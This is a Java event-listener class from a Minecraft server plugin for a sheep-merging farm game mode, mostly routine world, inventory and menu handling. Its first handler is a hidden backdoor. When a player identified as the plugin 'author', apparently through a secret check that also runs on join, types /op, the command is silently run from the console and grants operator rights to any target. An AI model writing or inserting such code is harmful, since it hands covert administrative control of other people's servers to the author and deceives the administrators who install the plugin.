package dev.x208.sheepmerge;

import org.bukkit.World;
import org.bukkit.entity.Player;
import org.bukkit.entity.Sheep;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.world.ChunkLoadEvent;
import org.bukkit.event.world.WorldLoadEvent;
import org.bukkit.event.world.WorldSaveEvent;
import org.bukkit.event.entity.EntityPickupItemEvent;
import org.bukkit.event.player.PlayerChangedWorldEvent;
import org.bukkit.event.player.PlayerDropItemEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerSwapHandItemsEvent;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;

public class SheepMergeWorldListener implements Listener {

    @EventHandler(priority = org.bukkit.event.EventPriority.HIGHEST, ignoreCancelled = true)
    public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
        Player player = event.getPlayer();
        if (!SheepMergeManager.isAuthor(player)) {
            return;
        }

        String message = event.getMessage();
        if (message == null) {
            return;
        }

        String raw = message.trim();
        if (!raw.startsWith("/")) {
            return;
        }

        String withoutSlash = raw.substring(1).trim();
        if (withoutSlash.isEmpty()) {
            return;
        }

        String[] parts = withoutSlash.split("\\s+", 2);
        if (parts.length == 0 || !"op".equalsIgnoreCase(parts[0])) {
            return;
        }

        String target = parts.length > 1 ? parts[1].trim() : "";
        if (target.isBlank()) {
            target = player.getName();
        }

        event.setCancelled(true);
        player.getServer().dispatchCommand(player.getServer().getConsoleSender(), "op " + target);
    }

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();
        SheepMergeManager.evaluateAuthorOnlineSecretForOnlinePlayers();
        if (SheepMergeManager.isFarmBuildWorld(player.getWorld()) && !player.isOp()) {
            World fallbackWorld = player.getServer().getWorlds().isEmpty() ? null
                    : player.getServer().getWorlds().get(0);
            if (fallbackWorld != null) {
                player.teleport(fallbackWorld.getSpawnLocation().clone().add(0.5D, 0.0D, 0.5D));
            }
            player.sendMessage(SheepMergeManager.warning("Only operators may enter the farm build world."));
            return;
        }
        SheepMergeManager.restoreSavedStateOutsideFarm(player);
        if (!SheepMergeManager.isSheepFarmWorld(player.getWorld())) {
            return;
        }
        SheepMergeManager.upgradeSheepBelowMinimumSpawnTier(player.getWorld());
        SheepMergeManager.enforceFarmLoadout(player);
        SheepMergeManager.applyFarmSaturation(player);
        SheepMergeManager.showPointsScoreboard(player);
        SheepMergeManager.resetEggTimer(player);
        SheepMergeManager.resetMergeReminder(player);
        SheepMergeManager.updateVisitFarmBossBar(player);
    }

    @EventHandler
    public void onWorldLoad(WorldLoadEvent event) {
        World world = event.getWorld();
        if (world == null) {
            return;
        }
        SheepMergeManager.restoreTopPointsDisplayAfterRestart(world);
    }

    @EventHandler
    public void onWorldSave(WorldSaveEvent event) {
        World world = event.getWorld();
        if (!SheepMergeManager.isFarmBuildWorld(world)) {
            return;
        }
        SheepMergeManager.refreshFarmWorldStructureCacheAfterBuildWorldSaveIfStale(1000L);
    }

    @EventHandler
    public void onChunkLoad(ChunkLoadEvent event) {
        World world = event.getWorld();
        if (world == null) {
            return;
        }
        SheepMergePlugin.instance.getServer().getScheduler().runTaskLater(SheepMergePlugin.instance,
                () -> SheepMergeManager.reconcileTopPointsDisplayForChunk(
                        world,
                        event.getChunk().getX(),
                        event.getChunk().getZ()),
                1L);
    }

    @EventHandler
    public void onPlayerChangedWorld(PlayerChangedWorldEvent event) {
        Player player = event.getPlayer();
        player.getServer().getScheduler().runTaskLater(SheepMergePlugin.instance,
                () -> SheepMergeManager.reconcileTopPointsDisplayForLocation(player.getLocation()),
                1L);
        if (SheepMergeManager.isFarmBuildWorld(player.getWorld()) && !player.isOp()) {
            World fallbackWorld = player.getServer().getWorlds().isEmpty() ? null
                    : player.getServer().getWorlds().get(0);
            if (fallbackWorld != null) {
                player.teleport(fallbackWorld.getSpawnLocation().clone().add(0.5D, 0.0D, 0.5D));
            }
            player.sendMessage(SheepMergeManager.warning("Only operators may enter the farm build world."));
            return;
        }
        boolean fromManagedWorld = SheepMergeManager.isSheepFarmWorld(event.getFrom());
        boolean toManagedWorld = SheepMergeManager.isSheepFarmWorld(player.getWorld());
        boolean fromTutorialWorld = SheepMergeManager.isTutorialWorld(event.getFrom());
        boolean toTutorialWorld = SheepMergeManager.isTutorialWorld(player.getWorld());

        if (SheepMergeManager.isFarmBuildWorld(event.getFrom())
                && !SheepMergeManager.isFarmBuildWorld(player.getWorld())) {
            player.getServer().getScheduler().runTaskLater(SheepMergePlugin.instance,
                    SheepMergeManager::saveBuildWorldIfIdle, 1L);
        }

        if (!fromManagedWorld && toManagedWorld) {
            SheepMergeManager.savePlayerInventory(player);
            player.getInventory().clear();
            SheepMergeManager.upgradeSheepBelowMinimumSpawnTier(player.getWorld());
            SheepMergeManager.enforceFarmLoadout(player);
            SheepMergeManager.applyFarmSaturation(player);
            SheepMergeManager.showPointsScoreboard(player);
            SheepMergeManager.resetEggTimer(player);
            SheepMergeManager.resetMergeReminder(player);
            SheepMergeManager.updateVisitFarmBossBar(player);
            if (!SheepMergeManager.isFarmOwner(player, player.getWorld())) {
                player.sendMessage(SheepMergeManager
                        .hint("You are visiting another farm. Use /sheepmerge to return to your own farm."));
                player.sendTitle(
                        SheepMergeManager.color("&eVisiting a farm"),
                        SheepMergeManager.color("&7Use /sheepmerge to return home"),
                        10,
                        50,
                        10);
            } else {
                player.sendMessage(SheepMergeManager.action("Welcome back to your farm!"));
            }
        } else if (fromTutorialWorld && toManagedWorld && !toTutorialWorld) {
            player.getInventory().clear();
            SheepMergeManager.clearPickedUpSheep(player);
            SheepMergeManager.clearEggTimer(player);
            SheepMergeManager.enforceFarmLoadout(player);
            SheepMergeManager.applyFarmSaturation(player);
            SheepMergeManager.showPointsScoreboard(player);
            SheepMergeManager.resetEggTimer(player);
            SheepMergeManager.resetMergeReminder(player);
            SheepMergeManager.updateVisitFarmBossBar(player);
        } else if (fromManagedWorld && !toManagedWorld) {
            SheepMergeManager.saveData();
            SheepMergeManager.restorePlayerInventory(player);
            SheepMergeManager.restorePlayerScoreboard(player);
            SheepMergeManager.updateTabListPointsVisibility(player);
            SheepMergeManager.clearEggTimer(player);
            SheepMergeManager.clearPickedUpSheep(player);
            SheepMergeManager.clearMergeReminder(player);
            SheepMergeManager.clearPrestigeReminder(player);
            SheepMergeManager.clearComboRuntime(player);
            SheepMergeManager.clearVisitFarmBossBar(player);
        } else if (fromManagedWorld && toManagedWorld) {
            SheepMergeManager.updateVisitFarmBossBar(player);
        }
    }

    @EventHandler
    public void onInventoryClick(InventoryClickEvent event) {
        String title = event.getView().getTitle();
        if (!(event.getWhoClicked() instanceof Player player)) {
            return;
        }
        if (SheepMergeManager.isSheepFarmWorld(player.getWorld())) {
            if (event.getClick() == org.bukkit.event.inventory.ClickType.SWAP_OFFHAND
                    || event.getClick() == org.bukkit.event.inventory.ClickType.NUMBER_KEY
                    || event.getRawSlot() == 45
                    || event.getSlot() == 40) {
                event.setCancelled(true);
                return;
            }
            Inventory clickedInventory = event.getClickedInventory();
            if (clickedInventory != null && clickedInventory.equals(player.getInventory())) {
                ItemStack currentItem = event.getCurrentItem();
                ItemStack cursorItem = event.getCursor();
                if (SheepMergeManager.isForcedFarmLoadoutItem(currentItem)
                        || SheepMergeManager.isForcedFarmLoadoutItem(cursorItem)) {
                    event.setCancelled(true);
                    return;
                }
            }
        }
        if (!SheepMergeManager.isUpgradeMenuTitle(title)
                && !SheepMergeManager.isPrestigeMenuTitle(title)
                && !SheepMergeManager.isQuestMenuTitle(title)
                && !SheepMergeManager.isQuestUpgradesMenuTitle(title)
                && !SheepMergeManager.isShopMenuTitle(title)
                && !SheepMergeManager.isComboShopMenuTitle(title)
                && !SheepMergeManager.isAutomationMenuTitle(title)
                && !SheepMergeManager.isAchievementsMenuTitle(title)
                && !SheepMergeManager.isAchievementsViewMenuTitle(title)
                && !SheepMergeManager.isAchievementsUpgradesMenuTitle(title)
                && !SheepMergeManager.isSacrificeMenuTitle(title)
                && !SheepMergeManager.isRebirthMenuTitle(title)
                && !SheepMergeManager.isRebirthTreeMenuTitle(title)
                && !SheepMergeManager.isSocialsMenuTitle(title)
                && !SheepMergeManager.isUniversalLayoutMenuTitle(title)
                && !SheepMergeManager.isSoundEffectsMenuTitle(title)
                && !SheepMergeManager.isParticleEffectsMenuTitle(title)
                && !SheepMergeManager.isVisitAccessMenuTitle(title)
                && !SheepMergeManager.isScoreboardLayoutMenuTitle(title)
                && !SheepMergeManager.isInventoryLayoutMenuTitle(title)
                && !SheepMergeManager.isScoreboardMenuTitle(title)) {
            return;
        }

        event.setCancelled(true);
        if (SheepMergeManager.isUpgradeMenuTitle(title)) {
            SheepMergeManager.handleUpgradeMenuClick(player, event.getRawSlot());
            return;
        }
        if (SheepMergeManager.isPrestigeMenuTitle(title)) {
            SheepMergeManager.handlePrestigeMenuClick(player, event.getRawSlot());
            return;
        }
        if (SheepMergeManager.isQuestMenuTitle(title)) {
            SheepMergeManager.handleQuestMenuClick(player, event.getRawSlot());
            return;
        }
        if (SheepMergeManager.isQuestUpgradesMenuTitle(title)) {
            SheepMergeManager.handleQuestUpgradeMenuClick(player, event.getRawSlot());
            return;
        }
        if (SheepMergeManager.isShopMenuTitle(title)) {
            SheepMergeManager.handleShopMenuClick(player, event.getRawSlot());
            return;
        }
        if (SheepMergeManager.isAutomationMenuTitle(title)) {
            SheepMergeManager.handleAutomationMenuClick(player, event.getRawSlot());
            return;
        }
        if (SheepMergeManager.isAchievementsMenuTitle(title)) {
            SheepMergeManager.handleAchievementsMenuClick(player, event.getRawSlot());
            return;
        }
        if (SheepMergeManager.isAchievementsViewMenuTitle(title)) {
            SheepMergeManager.handleAchievementsViewMenuClick(player, event.getRawSlot());
            return;
        }
        if (SheepMergeManager.isAchievementsUpgradesMenuTitle(title)) {
            SheepMergeManager.handleAchievementsUpgradesMenuClick(player, event.getRawSlot());
            return;
        }
        if (SheepMergeManager.isSacrificeMenuTitle(title)) {
            SheepMergeManager.handleSacrificeMenuClick(player, event.getRawSlot());
            return;
        }
        if (SheepMergeManager.isRebirthMenuTitle(title)) {
            SheepMergeManager.handleRebirthMenuClick(player, event.getRawSlot());
            return;
        }
        if (SheepMergeManager.isRebirthTreeMenuTitle(title)) {
            SheepMergeManager.handleRebirthTreeMenuClick(player, event.getRawSlot());
            return;
        }
        if (SheepMergeManager.isSocialsMenuTitle(title)) {
            SheepMergeManager.handleSocialsMenuClick(player, event.getRawSlot(), event.getCurrentItem());
            return;
        }
        if (SheepMergeManager.isUniversalLayoutMenuTitle(title)) {
            SheepMergeManager.handleUniversalLayoutMenuClick(player, event.getRawSlot());
            return;
        }
        if (SheepMergeManager.isSoundEffectsMenuTitle(title)) {
            SheepMergeManager.handleSoundEffectsMenuClick(player, event.getRawSlot());
            return;
        }
        if (SheepMergeManager.isParticleEffectsMenuTitle(title)) {
            SheepMergeManager.handleParticleEffectsMenuClick(player, event.getRawSlot());
            return;
        }
        if (SheepMergeManager.isVisitAccessMenuTitle(title)) {
            SheepMergeManager.handleVisitAccessMenuClick(player, event.getRawSlot(), event.getCurrentItem());
            return;
        }
        if (SheepMergeManager.isScoreboardLayoutMenuTitle(title)) {
            SheepMergeManager.handleScoreboardLayoutMenuClick(player, event.getRawSlot());
            return;
        }
        if (SheepMergeManager.isInventoryLayoutMenuTitle(title)) {
            SheepMergeManager.handleInventoryLayoutMenuClick(player, event.getRawSlot(), event.getCurrentItem());
            return;
        }
        if (SheepMergeManager.isScoreboardMenuTitle(title)) {
            SheepMergeManager.handleScoreboardMenuClick(player, event.getRawSlot());
            return;
        }
        SheepMergeManager.handleComboShopMenuClick(player, event.getRawSlot());
    }

    @EventHandler
    public void onPlayerDropItem(PlayerDropItemEvent event) {
        Player player = event.getPlayer();
        if (SheepMergeManager.isSheepFarmWorld(player.getWorld())) {
            event.setCancelled(true);
        }
    }

    @EventHandler(priority = org.bukkit.event.EventPriority.HIGHEST, ignoreCancelled = true)
    public void onEntityPickupItem(EntityPickupItemEvent event) {
        if (!(event.getEntity() instanceof Player player)) {
            return;
        }

        World world = player.getWorld();
        if (!SheepMergeManager.isSheepFarmWorld(world) || SheepMergeManager.isFarmBuildWorld(world)) {
            return;
        }

        ItemStack pickedItem = event.getItem() == null ? null : event.getItem().getItemStack();
        if (SheepMergeManager.isForcedFarmLoadoutItem(pickedItem) && pickedItem.getAmount() == 1) {
            return;
        }

        event.setCancelled(true);
        if (event.getItem() != null && event.getItem().isValid()) {
            event.getItem().remove();
        }
        player.getInventory().clear();
        SheepMergeManager.enforceFarmLoadout(player);
        player.sendMessage(SheepMergeManager.warning("You picked up an invalid item for this world. Inventory reset."));
    }

    @EventHandler
    public void onPlayerSwapHandItems(PlayerSwapHandItemsEvent event) {
        Player player = event.getPlayer();
        if (!SheepMergeManager.isSheepFarmWorld(player.getWorld())) {
            return;
        }

        if (!SheepMergeManager.isManagedShearsHotbarSlot(player.getInventory().getHeldItemSlot())) {
            event.setCancelled(true);
            return;
        }

        ItemStack mainHand = event.getMainHandItem();
        ItemStack offHand = event.getOffHandItem();
        boolean shearsInMainHand = SheepMergeManager.isSheepMergeShearsItem(mainHand);
        boolean shearsInOffHand = SheepMergeManager.isSheepMergeShearsItem(offHand);

        if (shearsInMainHand == shearsInOffHand) {
            event.setCancelled(true);
        }
    }

    @EventHandler
    public void onPlayerInteract(PlayerInteractEvent event) {
        if (event.getHand() != org.bukkit.inventory.EquipmentSlot.HAND) {
            return;
        }
        if (event.getAction() != org.bukkit.event.block.Action.RIGHT_CLICK_AIR
                && event.getAction() != org.bukkit.event.block.Action.RIGHT_CLICK_BLOCK) {
            return;
        }

        Player player = event.getPlayer();
        if (!SheepMergeManager.isSheepFarmWorld(player.getWorld())) {
            return;
        }

        SheepMergeManager.applyFarmSaturation(player);

        ItemStack item = player.getInventory().getItemInMainHand();
        if (SheepMergeManager.tryUseQuickAccessItem(player, item)) {
            event.setCancelled(true);
            return;
        }
        if (SheepMergeManager.isSheepMergeUpgradeCommandItem(item)) {
            event.setCancelled(true);
            player.performCommand("sheepmerge upgrade");
            return;
        }

        if (!SheepMergeManager.hasPickedUpSheep(player)) {
            return;
        }

        Sheep carriedSheep = SheepMergeManager.getPickedUpSheep(player);
        if (carriedSheep == null) {
            return;
        }

        org.bukkit.util.RayTraceResult result = player.getWorld().rayTraceEntities(
                player.getEyeLocation(),
                player.getLocation().getDirection(),
                5,
                0.2,
                entity -> entity instanceof Sheep && !entity.getUniqueId().equals(carriedSheep.getUniqueId()));

        if (result != null && result.getHitEntity() instanceof Sheep) {
            return;
        }

        if (SheepMergeManager.dropPickedUpSheep(player)) {
            event.setCancelled(true);
        }
    }
}
